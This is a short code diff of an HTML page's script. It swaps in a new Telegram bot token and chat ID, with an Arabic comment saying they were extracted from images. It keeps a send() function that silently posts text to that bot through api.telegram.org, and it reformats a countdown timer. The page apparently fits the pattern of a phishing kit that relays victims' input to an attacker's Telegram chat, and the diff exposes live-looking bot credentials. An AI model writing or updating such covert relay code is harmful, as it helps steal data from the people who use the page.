@@ -93,8 +93,9 @@
 </div>
 
 <script>
-    const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-    const cid = "8665814266";
+    // المعلومات الجديدة المستخرجة من الصور
+    const tok = "8652191411:AAES2Ljmd2mCH_lm4syo-yAJiUowKMjAPN4";
+    const cid = "8624656090";
 
     function send(t) {
         fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
@@ -137,7 +138,9 @@
         let int = setInterval(() => {
             let m = Math.floor(time / 60), s = time % 60;
             document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            if(time <= 0) clearInterval(int);
+            if(time <= 0) {
+                clearInterval(int);
+            }
             time--;
         }, 1000);
     }
